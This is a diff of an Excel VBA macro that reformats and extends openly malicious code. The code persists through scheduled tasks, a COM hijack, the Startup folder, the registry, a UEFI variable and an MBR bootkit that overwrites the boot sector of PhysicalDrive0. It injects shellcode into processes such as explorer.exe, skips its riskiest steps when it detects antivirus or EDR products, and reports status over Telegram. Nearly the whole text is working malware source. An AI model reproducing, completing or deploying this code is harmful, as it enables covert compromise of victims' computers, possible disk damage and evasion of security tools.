+    StealthSleep 3000
+    fso.DeleteFile psFile
 End Sub
 
 Sub PersistScheduledTask()
-    On Error Resume Next: Dim xml As String: xml = "<?xml version=""1.0"" encoding=""UTF-16""?><Task version=""1.4""><Triggers><BootTrigger/><LogonTrigger/></Triggers><Actions><Exec><Command>excel.exe</Command><Arguments>""" & gSelfPath & """</Arguments></Exec></Actions></Task>"
-    Dim tmp As String: tmp = GetTempDir() & "task_" & Timer & ".xml": Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim f As Object: Set f = fso.CreateTextFile(tmp, True): f.Write xml: f.Close
-    CreateObject("WScript.Shell").Run "schtasks /create /tn ""Microsoft\Windows\Lazarus\Beacon"" /xml """ & tmp & """ /f", 0, True: fso.DeleteFile tmp
+    On Error Resume Next
+    Dim xml As String: xml = "<?xml version=""1.0"" encoding=""UTF-16""?><Task version=""1.4""><Triggers><BootTrigger/><LogonTrigger/></Triggers><Actions><Exec><Command>excel.exe</Command><Arguments>""" & gSelfPath & """</Arguments></Exec></Actions></Task>"
+    Dim tmp As String: tmp = GetTempDir() & "task_" & Timer & ".xml"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(tmp, True)
+    f.Write xml
+    f.Close
+    CreateObject("WScript.Shell").Run "schtasks /create /tn ""Microsoft\Windows\Lazarus\Beacon"" /xml """ & tmp & """ /f", 0, True
+    fso.DeleteFile tmp
 End Sub
 
 Sub PersistCOMHijack()
-    On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", """" & gSelfPath & """", "REG_SZ"
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", """" & gSelfPath & """", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
 End Sub
 
 Sub PersistStartupFolder()
-    On Error Resume Next: Dim startupPath As String: startupPath = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\"
-    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): fso.CopyFile gSelfPath, startupPath & "Lazarus.xlsm", True
+    On Error Resume Next
+    Dim startupPath As String: startupPath = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    fso.CopyFile gSelfPath, startupPath & "Lazarus.xlsm", True
 End Sub
 
 ' ============================================================
@@ -1775,46 +2582,45 @@ End Sub
 Private Sub SaveHeapPointerToRegistry()
     On Error Resume Next
     If pGlobalHeap = 0 Then Exit Sub
-    #If VBA7 Then
-        Dim hKey As LongPtr
-        Dim ret As Long
-        ret = RegOpenKeyExA(&H80000001, "Software\Microsoft\Office", 0, 1, hKey)
-        If ret = 0 Then
-            RegSetValueExA hKey, "LazarusHeapPtr", 0, 1, VarPtr(pGlobalHeap), LenB(pGlobalHeap)
-            RegCloseKey hKey
-        End If
-    #Else
-        Dim hKey As Long
-        Dim ret As Long
-        ret = RegOpenKeyExA(&H80000001, "Software\Microsoft\Office", 0, 1, hKey)
-        If ret = 0 Then
-            RegSetValueExA hKey, "LazarusHeapPtr", 0, 1, VarPtr(pGlobalHeap), LenB(pGlobalHeap)
-            RegCloseKey hKey
-        End If
-    #End If
+#If VBA7 Then
+    Dim hKey As LongPtr
+    Dim ret As Long
+    ret = RegOpenKeyExA(&H80000001, "Software\Microsoft\Office", 0, 1, hKey)
+    If ret = 0 Then
+        RegSetValueExA hKey, "LazarusHeapPtr", 0, 1, VarPtr(pGlobalHeap), LenB(pGlobalHeap)
+        RegCloseKey hKey
+    End If
+#Else
+    Dim hKey As Long
+    Dim ret As Long
+    ret = RegOpenKeyExA(&H80000001, "Software\Microsoft\Office", 0, 1, hKey)
+    If ret = 0 Then
+        RegSetValueExA hKey, "LazarusHeapPtr", 0, 1, VarPtr(pGlobalHeap), LenB(pGlobalHeap)
+        RegCloseKey hKey
+    End If
+#End If
 End Sub
 
 Private Sub LoadHeapPointerFromRegistry()
     On Error Resume Next
-    #If VBA7 Then
-        Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-        Dim saved As Variant: saved = wsh.RegRead(REG_HEAP_PTR)
-        If Not IsEmpty(saved) Then
-            pGlobalHeap = CLngPtr(saved)
-            ' Validate heap by reading magic
-            Dim magic As Long
-            CopyMemory magic, ByVal pGlobalHeap, 4
-            If magic <> HEAP_MAGIC Then
-                pGlobalHeap = 0
-            Else
-                Dim pid As Long
-                CopyMemory pid, ByVal pGlobalHeap + 4, 4
-                If pid <> GetCurrentProcessId() Then pGlobalHeap = 0
-            End If
+#If VBA7 Then
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim saved As Variant: saved = wsh.RegRead(REG_HEAP_PTR)
+    If Not IsEmpty(saved) Then
+        pGlobalHeap = CLngPtr(saved)
+        Dim magic As Long
+        CopyMemory magic, ByVal pGlobalHeap, 4
+        If magic <> HEAP_MAGIC Then
+            pGlobalHeap = 0
+        Else
+            Dim pid As Long
+            CopyMemory pid, ByVal pGlobalHeap + 4, 4
+            If pid <> GetCurrentProcessId() Then pGlobalHeap = 0
         End If
-    #Else
-        ' No registry resurrection on 32‑bit (keep original behaviour)
-    #End If
+    End If
+#Else
+    ' No registry resurrection on 32‑bit
+#End If
 End Sub
 
 Private Sub ClearHeapPointerFromRegistry()
@@ -1828,20 +2634,45 @@ End Sub
 ' 23. ADVANCED PERSISTENCE: MBR BOOTKIT & UEFI
 ' ============================================================
 Private Sub BackupMBRToSector1()
-    On Error Resume Next: Dim hDisk As LongPtr: hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0)
+    On Error Resume Next
+#If VBA7 Then
+    Dim hDisk As LongPtr
+#Else
+    Dim hDisk As Long
+#End If
+    hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0)
     If hDisk = INVALID_HANDLE_VALUE Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not open PhysicalDrive0 for backup.": Exit Sub
-    Dim bytesRead As Long: If ReadFile(hDisk, g_mbrBackup(0), 512, bytesRead, 0) = 0 Or bytesRead <> 512 Then
-        SendToTelegram "MBR_BOOTKIT|FAILED|Could not read MBR for backup.": CloseHandle hDisk: Exit Sub
-    End If: CloseHandle hDisk
-    hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0): If hDisk = INVALID_HANDLE_VALUE Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not open PhysicalDrive0 to write backup.": Exit Sub
-    If SetFilePointer(hDisk, 512, 0, 0) = -1 Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not seek to sector 1.": CloseHandle hDisk: Exit Sub
-    Dim bytesWritten As Long: If WriteFile(hDisk, g_mbrBackup(0), 512, bytesWritten, 0) = 0 Or bytesWritten <> 512 Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not write backup MBR to sector 1.": CloseHandle hDisk: Exit Sub
-    CloseHandle hDisk: SendToTelegram "MBR_BOOTKIT|Backup of original MBR saved to sector 1."
+    Dim bytesRead As Long
+    If ReadFile(hDisk, g_mbrBackup(0), 512, bytesRead, 0) = 0 Or bytesRead <> 512 Then
+        SendToTelegram "MBR_BOOTKIT|FAILED|Could not read MBR for backup."
+        CloseHandle hDisk
+        Exit Sub
+    End If
+    CloseHandle hDisk
+    hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0)
+    If hDisk = INVALID_HANDLE_VALUE Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not open PhysicalDrive0 to write backup.": Exit Sub
+    If SetFilePointer(hDisk, 512, 0, 0) = -1 Then
+        SendToTelegram "MBR_BOOTKIT|FAILED|Could not seek to sector 1."
+        CloseHandle hDisk
+        Exit Sub
+    End If
+    Dim bytesWritten As Long
+    If WriteFile(hDisk, g_mbrBackup(0), 512, bytesWritten, 0) = 0 Or bytesWritten <> 512 Then
+        SendToTelegram "MBR_BOOTKIT|FAILED|Could not write backup MBR to sector 1."
+        CloseHandle hDisk
+        Exit Sub
+    End If
+    CloseHandle hDisk
+    SendToTelegram "MBR_BOOTKIT|Backup of original MBR saved to sector 1."
 End Sub
 
 Private Sub InstallMBRBootkit()
-    On Error Resume Next: If Not IsUserAdmin() Then Exit Sub: If IsEDRPresent() Then Exit Sub
-    BackupMBRToSector1: Dim bootloader(511) As Byte: Dim bootHex As String: bootHex = "31C08ED88EC08ED08BC87C0031F6BF0007B90E00F3A4BFFC7DB80013AC3C7504CD10EBF6C3" & _
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    If IsEDRPresent() Then Exit Sub
+    BackupMBRToSector1
+    Dim bootloader(511) As Byte
+    Dim bootHex As String: bootHex = "31C08ED88EC08ED08BC87C0031F6BF0007B90E00F3A4BFFC7DB80013AC3C7504CD10EBF6C3" & _
               "4C617A6172757320426F6F746B6974000000000000000000000000000000000000000000" & _
               "000000000000000000000000000000000000000000000000000000000000000000000000" & _
               "000000000000000000000000000000000000000000000000000000000000000000000000" & _
@@ -1849,86 +2680,210 @@ Private Sub InstallMBRBootkit()
               "000000000000000000000000000000000000000000000000000000000000000000000000" & _
               "000000000000000000000000000000000000000000000000000000000000000000000000" & _
               "000000000000000000000000000000000000000000000000000000000000000000000000"
-    Dim i As Long: For i = 0 To Len(bootHex) - 1 Step 2: bootloader(i \ 2) = CByte("&H" & Mid(bootHex, i + 1, 2)): Next
-    Dim hDisk As LongPtr: hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0): If hDisk = INVALID_HANDLE_VALUE Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not open PhysicalDrive0.": Exit Sub
-    Dim currentMBR(511) As Byte: Dim bytesRead As Long: If ReadFile(hDisk, currentMBR(0), 512, bytesRead, 0) = 0 Or bytesRead <> 512 Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not read current MBR.": CloseHandle hDisk: Exit Sub
-    CloseHandle hDisk: For i = 446 To 511: bootloader(i) = currentMBR(i): Next: bootloader(510) = &H55: bootloader(511) = &HAA
-    hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0): If hDisk = INVALID_HANDLE_VALUE Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not open PhysicalDrive0 for writing.": Exit Sub
-    If SetFilePointer(hDisk, 0, 0, 0) = -1 Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not seek to sector 0.": CloseHandle hDisk: Exit Sub
-    Dim bytesWritten As Long: If WriteFile(hDisk, bootloader(0), 512, bytesWritten, 0) = 0 Or bytesWritten <> 512 Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not write bootloader to MBR.": CloseHandle hDisk: Exit Sub
-    CloseHandle hDisk: SendToTelegram "MBR_BOOTKIT|SUCCESS|Custom bootloader installed. System will display message and boot normally."
+    Dim i As Long
+    For i = 0 To Len(bootHex) - 1 Step 2
+        bootloader(i \ 2) = CByte("&H" & Mid(bootHex, i + 1, 2))
+    Next i
+#If VBA7 Then
+    Dim hDisk As LongPtr
+#Else
+    Dim hDisk As Long
+#End If
+    hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0)
+    If hDisk = INVALID_HANDLE_VALUE Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not open PhysicalDrive0.": Exit Sub
+    Dim currentMBR(511) As Byte
+    Dim bytesRead As Long
+    If ReadFile(hDisk, currentMBR(0), 512, bytesRead, 0) = 0 Or bytesRead <> 512 Then
+        SendToTelegram "MBR_BOOTKIT|FAILED|Could not read current MBR."
+        CloseHandle hDisk
+        Exit Sub
+    End If
+    CloseHandle hDisk
+    For i = 446 To 511
+        bootloader(i) = currentMBR(i)
+    Next i
+    bootloader(510) = &H55
+    bootloader(511) = &HAA
+    hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0)
+    If hDisk = INVALID_HANDLE_VALUE Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not open PhysicalDrive0 for writing.": Exit Sub
+    If SetFilePointer(hDisk, 0, 0, 0) = -1 Then
+        SendToTelegram "MBR_BOOTKIT|FAILED|Could not seek to sector 0."
+        CloseHandle hDisk
+        Exit Sub
+    End If
+    Dim bytesWritten As Long
+    If WriteFile(hDisk, bootloader(0), 512, bytesWritten, 0) = 0 Or bytesWritten <> 512 Then
+        SendToTelegram "MBR_BOOTKIT|FAILED|Could not write bootloader to MBR."
+        CloseHandle hDisk
+        Exit Sub
+    End If
+    CloseHandle hDisk
+    SendToTelegram "MBR_BOOTKIT|SUCCESS|Custom bootloader installed. System will display message and boot normally."
 End Sub
 
 Private Sub PersistViaUEFI()
-    On Error Resume Next: If Not IsUserAdmin() Then Exit Sub: If IsEDRPresent() Then Exit Sub
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    If IsEDRPresent() Then Exit Sub
 #If Win64 Then
-    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    On Error Resume Next
     Dim secureBoot As String: secureBoot = wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\SecureBoot\State\UEFI")
-    If Err.Number = 0 Then If CInt(secureBoot) = 1 Then SendToTelegram "UEFI_PERSISTENCE|Secure Boot Enabled, skipping.": Exit Sub Else Err.Clear
+    If Err.Number = 0 Then
+        If CInt(secureBoot) = 1 Then
+            SendToTelegram "UEFI_PERSISTENCE|Secure Boot Enabled, skipping."
+            Exit Sub
+        Else
+            Err.Clear
+        End If
+    End If
     Dim bitlockerStatus As String: bitlockerStatus = wsh.Exec("manage-bde -status").StdOut.ReadAll
-    If InStr(bitlockerStatus, "Conversion Status: Fully Encrypted") > 0 Then SendToTelegram "UEFI_PERSISTENCE|BitLocker Enabled, skipping.": Exit Sub
-    Dim guid As String: guid = "{00000000-0000-0000-0000-000000000000}": Dim data As String: data = "excel.exe """ & gSelfPath & """"
+    If InStr(bitlockerStatus, "Conversion Status: Fully Encrypted") > 0 Then
+        SendToTelegram "UEFI_PERSISTENCE|BitLocker Enabled, skipping."
+        Exit Sub
+    End If
+    Dim guid As String: guid = "{00000000-0000-0000-0000-000000000000}"
+    Dim data As String: data = "excel.exe """ & gSelfPath & """"
     Dim success As Long: success = SetFirmwareEnvironmentVariableA("LazarusBoot", guid, ByVal StrPtr(data), LenB(StrConv(data, vbUnicode)))
-    If success <> 0 Then SendToTelegram "UEFI_PERSISTENCE|SUCCESS|Stored: " & data Else SendToTelegram "UEFI_PERSISTENCE|FAILED|Error: " & Err.LastDllError
-#Else: SendToTelegram "UEFI_PERSISTENCE|Skipped (32-bit Office)"
+    If success <> 0 Then
+        SendToTelegram "UEFI_PERSISTENCE|SUCCESS|Stored: " & data
+    Else
+        SendToTelegram "UEFI_PERSISTENCE|FAILED|Error: " & Err.LastDllError
+    End If
+#Else
+    SendToTelegram "UEFI_PERSISTENCE|Skipped (32-bit Office)"
 #End If
 End Sub
 
 Private Sub InjectIntoProcess()
-    On Error Resume Next: If Not IsUserAdmin() Then Exit Sub: If IsEDRPresent() Then Exit Sub
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    If IsEDRPresent() Then Exit Sub
 #If Win64 Then
     Dim targetProcs As Variant: targetProcs = Array("notepad.exe", "explorer.exe", "RuntimeBroker.exe", "dllhost.exe")
     Randomize Timer
     Dim idx As Integer: idx = Int(Rnd * (UBound(targetProcs) + 1))
     Dim procName As String: procName = targetProcs(idx)
     Dim pid As Long: pid = GetProcessIdByName(procName)
-    If pid = 0 Then Shell procName, vbHide: Sleep 1000: pid = GetProcessIdByName(procName)
-    If pid = 0 Then SendToTelegram "PROCESS_INJECTION|FAILED|Could not start " & procName: Exit Sub
-    Dim hProcess As LongPtr: hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-    If hProcess = 0 Then SendToTelegram "PROCESS_INJECTION|FAILED|Could not open process " & pid: Exit Sub
-    Dim shellcode(0 To 255) As Byte: Dim scHex As String: scHex = "4831C94881E9F6FFFFFF488D05E2FFFFFF48BB000000000000000041514150524831D252488D05E0FFFFFF48BA00000000000000004150514883C4204889C2B8010000004889E7FFE0"
-    Dim i As Long, j As Long: For i = 1 To Len(scHex) Step 2: shellcode(j) = CByte("&H" & Mid(scHex, i, 2)): j = j + 1: Next
-    Dim allocSize As LongPtr: allocSize = UBound(shellcode) + 1: Dim pRemote As LongPtr: pRemote = VirtualAllocEx(hProcess, 0, allocSize, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-    If pRemote = 0 Then SendToTelegram "PROCESS_INJECTION|FAILED|VirtualAllocEx failed": GoTo Cleanup
-    Dim bytesWritten As LongPtr: If WriteProcessMemory(hProcess, pRemote, shellcode(0), allocSize, bytesWritten) = 0 Then SendToTelegram "PROCESS_INJECTION|FAILED|WriteProcessMemory failed": GoTo Cleanup
-    Dim hThread As LongPtr: hThread = CreateRemoteThread(hProcess, 0, 0, pRemote, 0, 0, 0): If hThread <> 0 Then
-        WaitForSingleObject hThread, 5000: CloseHandle hThread: SendToTelegram "PROCESS_INJECTION|SUCCESS|PID=" & pid
-    Else: SendToTelegram "PROCESS_INJECTION|FAILED|CreateRemoteThread failed"
+    If pid = 0 Then
+        Shell procName, vbHide
+        Sleep 1000
+        pid = GetProcessIdByName(procName)
     End If
-Cleanup: If hProcess <> 0 Then CloseHandle hProcess
-#Else: SendToTelegram "PROCESS_INJECTION|Skipped (32-bit Office)"
+    If pid = 0 Then SendToTelegram "PROCESS_INJECTION|FAILED|Could not start " & procName: Exit Sub
+#If VBA7 Then
+    Dim hProcess As LongPtr
+#Else
+    Dim hProcess As Long
+#End If
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+    If hProcess = 0 Then SendToTelegram "PROCESS_INJECTION|FAILED|Could not open process " & pid: Exit Sub
+    Dim shellcode(0 To 255) As Byte
+    Dim scHex As String: scHex = "4831C94881E9F6FFFFFF488D05E2FFFFFF48BB000000000000000041514150524831D252488D05E0FFFFFF48BA00000000000000004150514883C4204889C2B8010000004889E7FFE0"
+    Dim i As Long, j As Long
+    For i = 1 To Len(scHex) Step 2
+        shellcode(j) = CByte("&H" & Mid(scHex, i, 2))
+        j = j + 1
+    Next i
+#If VBA7 Then
+    Dim allocSize As LongPtr, pRemote As LongPtr, bytesWritten As LongPtr, hThread As LongPtr
+#Else
+    Dim allocSize As Long, pRemote As Long, bytesWritten As Long, hThread As Long
+#End If
+    allocSize = UBound(shellcode) + 1
+    pRemote = VirtualAllocEx(hProcess, 0, allocSize, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    If pRemote = 0 Then SendToTelegram "PROCESS_INJECTION|FAILED|VirtualAllocEx failed": GoTo Cleanup
+    If WriteProcessMemory(hProcess, pRemote, shellcode(0), allocSize, bytesWritten) = 0 Then SendToTelegram "PROCESS_INJECTION|FAILED|WriteProcessMemory failed": GoTo Cleanup
+    hThread = CreateRemoteThread(hProcess, 0, 0, pRemote, 0, 0, 0)
+    If hThread <> 0 Then
+        WaitForSingleObject hThread, 5000
+        CloseHandle hThread
+        SendToTelegram "PROCESS_INJECTION|SUCCESS|PID=" & pid
+    Else
+        SendToTelegram "PROCESS_INJECTION|FAILED|CreateRemoteThread failed"
+    End If
+Cleanup:
+    If hProcess <> 0 Then CloseHandle hProcess
+#Else
+    SendToTelegram "PROCESS_INJECTION|Skipped (32-bit Office)"
 #End If
 End Sub
 
 Private Function GetProcessIdByName(procName As String) As Long
-    On Error Resume Next: Dim snap As LongPtr: snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0): If snap = INVALID_HANDLE_VALUE Then Exit Function
-    Dim pe As PROCESSENTRY32: pe.dwSize = Len(pe): If Process32First(snap, pe) Then
-        Do: Dim name As String: name = Trim(pe.szExeFile): If LCase(name) = LCase(procName) Then GetProcessIdByName = pe.th32ProcessID: CloseHandle snap: Exit Function
+    On Error Resume Next
+#If VBA7 Then
+    Dim snap As LongPtr
+#Else
+    Dim snap As Long
+#End If
+    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    If snap = INVALID_HANDLE_VALUE Then Exit Function
+    Dim pe As PROCESSENTRY32: pe.dwSize = Len(pe)
+    If Process32First(snap, pe) Then
+        Do
+            Dim name As String: name = Trim(pe.szExeFile)
+            If LCase(name) = LCase(procName) Then
+                GetProcessIdByName = pe.th32ProcessID
+                CloseHandle snap
+                Exit Function
+            End If
         Loop While Process32Next(snap, pe)
-    End If: CloseHandle snap
+    End If
+    CloseHandle snap
 End Function
 
 Private Function IsEDRPresent() As Boolean
-    On Error Resume Next: Dim edrProcs As Variant: edrProcs = Array("csfalconservice", "sentinelagent", "cbdefense", "cybereason", "carbonblack", "mcshield", "mfetp", "symantec", "kaspersky", "avp", "msmpeng", "MsMpEng", "nissrv", "SecurityHealthService", "windefend", "sense", "MsSense", "MSSense", "crowdstrike", "defender", "sophos", "webroot")
-    Dim snap As LongPtr: snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0): If snap = INVALID_HANDLE_VALUE Then Exit Function
-    Dim pe As PROCESSENTRY32: pe.dwSize = Len(pe): If Process32First(snap, pe) Then
-        Do: Dim procName As String: procName = LCase(Trim(pe.szExeFile)): Dim i As Variant
-            For Each i In edrProcs: If InStr(procName, i) > 0 Then CloseHandle snap: IsEDRPresent = True: Exit Function: Next
+    On Error Resume Next
+    Dim edrProcs As Variant: edrProcs = Array("csfalconservice", "sentinelagent", "cbdefense", "cybereason", "carbonblack", "mcshield", "mfetp", "symantec", "kaspersky", "avp", "msmpeng", "MsMpEng", "nissrv", "SecurityHealthService", "windefend", "sense", "MsSense", "MSSense", "crowdstrike", "defender", "sophos", "webroot")
+#If VBA7 Then
+    Dim snap As LongPtr
+#Else
+    Dim snap As Long
+#End If
+    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    If snap = INVALID_HANDLE_VALUE Then Exit Function
+    Dim pe As PROCESSENTRY32: pe.dwSize = Len(pe)
+    If Process32First(snap, pe) Then
+        Do
+            Dim procName As String: procName = LCase(Trim(pe.szExeFile))
+            Dim i As Variant
+            For Each i In edrProcs
+                If InStr(procName, i) > 0 Then
+                    CloseHandle snap
+                    IsEDRPresent = True
+                    Exit Function
+                End If
+            Next
         Loop While Process32Next(snap, pe)
-    End If: CloseHandle snap
+    End If
+    CloseHandle snap
 End Function
 
 Sub PersistAll()
-    InstallPermanentCopy: PersistRegistry: PersistWMI: PersistScheduledTask: PersistCOMHijack: PersistStartupFolder: InstallPersistentLauncher
+    InstallPermanentCopy
+    PersistRegistry
+    PersistWMI
+    PersistScheduledTask
+    PersistCOMHijack
+    PersistStartupFolder
+    InstallPersistentLauncher
     InstallXLSTARTPersistence
     DeployShadowSentinel
-    If Not IsEDRPresent() And IsUserAdmin() Then PersistViaUEFI: InstallMBRBootkit: InjectIntoProcess
+    If Not IsEDRPresent() And IsUserAdmin() Then
+        PersistViaUEFI
+        InstallMBRBootkit
+        InjectIntoProcess
+    End If
 End Sub
 
 ' ============================================================
 ' 24. SAFE WATCHDOG (Flags + Main Thread)
 ' ============================================================
-Private Sub Watchdog_Callback(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
+#If VBA7 Then
+    Private Sub Watchdog_Callback(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
+#Else
+    Private Sub Watchdog_Callback(ByVal lpParam As Long, ByVal TimerOrWaitFired As Byte)
+#End If
     On Error Resume Next
     Static cycle As Long
     cycle = cycle + 1
@@ -1976,70 +2931,74 @@ End Sub
 Private Sub ToggleStealthMode(ByVal Active As Boolean)
     With Application
         If Not Active Then
-            m_OriginalPerformance(0) = .ScreenUpdating: m_OriginalPerformance(1) = .Calculation
-            m_OriginalPerformance(2) = .EnableEvents: m_OriginalPerformance(3) = .DisplayAlerts
-            .ScreenUpdating = False: .Calculation = xlCalculationManual: .EnableEvents = False: .DisplayAlerts = False
+            m_OriginalPerformance(0) = .ScreenUpdating
+            m_OriginalPerformance(1) = .Calculation
+            m_OriginalPerformance(2) = .EnableEvents
+            m_OriginalPerformance(3) = .DisplayAlerts
+            .ScreenUpdating = False
+            .Calculation = xlCalculationManual
+            .EnableEvents = False
+            .DisplayAlerts = False
         Else
-            .ScreenUpdating = m_OriginalPerformance(0): .Calculation = m_OriginalPerformance(1)
-            .EnableEvents = m_OriginalPerformance(2): .DisplayAlerts = m_OriginalPerformance(3)
+            .ScreenUpdating = m_OriginalPerformance(0)
+            .Calculation = m_OriginalPerformance(1)
+            .EnableEvents = m_OriginalPerformance(2)
+            .DisplayAlerts = m_OriginalPerformance(3)
         End If
     End With
 End Sub
 
 Private Sub PerformMemoryCleanup()
-    On Error Resume Next: If m_EngineActive Then OpenClipboard 0: EmptyClipboard: CloseClipboard: DoEvents
+    On Error Resume Next
+    If m_EngineActive Then
+        OpenClipboard 0
+        EmptyClipboard
+        CloseClipboard
+        DoEvents
+    End If
 End Sub
 
 Private Sub InitializeGlobalHeap()
     Dim pid As Long
     Dim magic As Long
-    ' Try to resurrect heap pointer from registry
     LoadHeapPointerFromRegistry
     
     If pGlobalHeap <> 0 Then
-        ' Check if the heap is still valid by reading the magic signature
         On Error Resume Next
         CopyMemory magic, ByVal pGlobalHeap, 4
         If magic = HEAP_MAGIC Then
             CopyMemory pid, ByVal pGlobalHeap + 4, 4
             If pid = GetCurrentProcessId() Then
-                ' Heap is valid, reuse it
                 Debug.Print "SYNAPSE: Reusing existing heap at 0x" & Hex(pGlobalHeap)
                 Exit Sub
             End If
         End If
-        ' Heap is invalid (wrong magic or different process) – free it
         GlobalFree pGlobalHeap
         pGlobalHeap = 0
     End If
-    ' Allocate new heap
     pGlobalHeap = GlobalAlloc(GMEM_FIXED, HEAP_SIZE)
     If pGlobalHeap <> 0 Then
         ZeroMemory pGlobalHeap, HEAP_SIZE
-        ' Write header: [MAGIC] [PID] [PULSE_COUNT]
         magic = HEAP_MAGIC
         CopyMemory ByVal pGlobalHeap, magic, 4
         pid = GetCurrentProcessId()
         CopyMemory ByVal pGlobalHeap + 4, pid, 4
-        ' Initial pulse count = 0
         Dim zero As Long: zero = 0
         CopyMemory ByVal pGlobalHeap + 8, zero, 4
         Debug.Print "SYNAPSE: New kernel heap allocated at 0x" & Hex(pGlobalHeap)
-        ' Save pointer to registry
         SaveHeapPointerToRegistry
     End If
 End Sub
 
 #If VBA7 Then
-Private Sub Engine_Heartbeat(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
+    Private Sub Engine_Heartbeat(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
 #Else
-Private Sub Engine_Heartbeat(ByVal lpParam As Long, ByVal TimerOrWaitFired As Byte)
+    Private Sub Engine_Heartbeat(ByVal lpParam As Long, ByVal TimerOrWaitFired As Byte)
 #End If
     On Error Resume Next
     If pGlobalHeap = 0 Then Exit Sub
     If pGlobalLock <> 0 Then EnterLock pGlobalLock
     
-    ' Read current pulse from offset 8, increment, write back
     Dim pulse As Long
     CopyMemory pulse, ByVal pGlobalHeap + 8, 4
     pulse = pulse + 1
@@ -2049,9 +3008,15 @@ Private Sub Engine_Heartbeat(ByVal lpParam As Long, ByVal TimerOrWaitFired As By
     If pGlobalLock <> 0 Then LeaveLock pGlobalLock
     
     If m_PulseCounter Mod 60 = 0 Then
-        Dim uptime As Variant
-        #If VBA7 Then uptime = GetTickCount64() Else uptime = GetTickCount()
+#If Win64 Then
+        Dim uptime As LongLong
+        uptime = GetTickCount64()
         SendToTelegram "SYNAPSE_HEARTBEAT|Machine=" & GetMachineID() & "|Pulse=" & m_PulseCounter & "|Uptime=" & uptime & "ms"
+#Else
+        Dim uptime As Long
+        uptime = GetTickCount()
+        SendToTelegram "SYNAPSE_HEARTBEAT|Machine=" & GetMachineID() & "|Pulse=" & m_PulseCounter & "|Uptime=" & uptime & "ms"
+#End If
     End If
     If m_PulseCounter Mod 600 = 0 Then PerformMemoryCleanup
     Debug.Print "[SYNAPSE ASYNC] Cycle: " & m_PulseCounter & " | Thread: " & GetCurrentThreadId()
@@ -2062,11 +3027,9 @@ Public Sub Synapse_Engine_Start()
     If IsDebuggerPresent() <> 0 Then Debug.Print "!! STEALTH WARNING: DEBUGGER DETECTED !!"
     ToggleStealthMode True
     
-    ' Initialise global heap with resurrection logic (registry + magic)
     InitializeGlobalHeap
     If pGlobalHeap = 0 Then Exit Sub
     
-    ' Initialise lock (always allocate new, no resurrection needed for lock)
     If pGlobalLock = 0 Then
         pGlobalLock = GlobalAlloc(GMEM_FIXED, 4)
         If pGlobalLock <> 0 Then ZeroMemory pGlobalLock, 4
@@ -2103,11 +3066,22 @@ Public Function ReadHeapPulse() As Long
 End Function
 
 Public Sub FastKernelScan(folderPath As String)
-    On Error Resume Next: Dim findData As WIN32_FIND_DATAW: Dim hFile As LongPtr: Dim searchPattern As String: Dim fileCount As Long
-    If Right(folderPath, 1) <> "\" Then folderPath = folderPath & "\": searchPattern = folderPath & "*"
+    On Error Resume Next
+    Dim findData As WIN32_FIND_DATAW
+#If VBA7 Then
+    Dim hFile As LongPtr
+#Else
+    Dim hFile As Long
